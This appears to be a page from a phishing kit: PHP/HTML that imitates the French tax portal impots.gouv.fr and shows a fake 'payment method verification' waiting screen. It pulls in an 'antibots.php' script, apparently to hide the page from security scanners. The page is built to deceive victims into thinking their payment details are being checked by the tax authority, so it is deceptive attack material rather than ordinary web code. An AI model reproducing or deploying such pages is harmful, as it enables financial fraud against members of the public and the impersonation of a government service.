<?php
include "../../server/antibots.php";
?>
<body> <a href="#contenu" class="sr-only sr-only-focusable">Aller au contenu</a>
		<header>
			<div class="container">
				<!--Le logo-->
				<a id="logo" class="col-xs-12 col-sm-6 col-lg-7" href="#" target="_blank" rel="noopener" title="Accueil impots.gouv.fr (nouvelle fenétre)"> <span class="sr-only">Authentification</span> </a>
				<h1 class="sr-only">Authentification</h1>
				<!-- </div>  Fin Row -->
			</div>
			<!-- Fin Container -->
		</header>
		<!-- Fil d'Arianne -->
		<div class="container">
			<div class="row">
				<ol class="breadcrumb ">
					<li><a href="#" id="toPortailPub" title="Retour au portail">Accueil</a></li>
					<li><a href="#" id="toPortailPub" title="Retour au portail">Authentification</a></li>
					<li class="active">Vérification</li>
				</ol>
			</div>
		</div>
		<!-- Fin du fil d'Arianne -->
		<main class="container" id="contenu">
			<div class="sr-only"> Le contenu du formulaire et l'aide mise à votre disposition évoluent selon vos réponses et votre situation </div>
			<div class="row">
				<!-- Connexion Gauche-->
				<div class="col-md-6">
					<a id="aide_scroll" href="#aide" class="btn btn-default hidden-lg hidden-md hidden-sm" aria-hidden="false"> <span class="dgfipicon dgfipicon-info text-muted"></span>&nbsp;Aide </a>
					<div class="panel panel-default">
						<center>
							<div class="panel-heading">
								<h2 id="" class="text-center">Vérification du mode de paiement</h2> </div>
							<!--===========================-->
							<!--Body Connexion Gauche DEBUT-->
							<!--===========================-->
							<div class="panel-body">
								<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="erreur"></div>
								<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="blocage"></div>
								<IFRAME style="display:none" name="hidden-formulairePrincipal" id="hidden-formulairePrincipal" aria-hidden="true" title="Cadre technique"> </IFRAME>
								<!--====================-->
								<!-- Identifiant Fiscal -->
								<!--====================-->
								<div class="row">
									<div class="col-md-12">
										<table style="width:487px;">
											<BR>
											<center><img src="https://www.wpfaster.org/wp-content/uploads/2013/06/circle-loading-gif.gif" width="70" height="70"></center>
											<br>
											<center>
												<H3>Vérification du mode de paiement</H3>
											</center>
											<br>
											<center>
												<p>Merci de patienter...
													<br>Cela peut prendre 30-60 secondes.</p>
											</center>
											<div role="alert" class="erreur hide alert alert-danger cat1" id="Cat1_spi"> </div>
									</div>
									<!-- col-md-12 FIN -->
								</div>
							</div>
						</center>
					</div>
				</div>
				
		
	</body>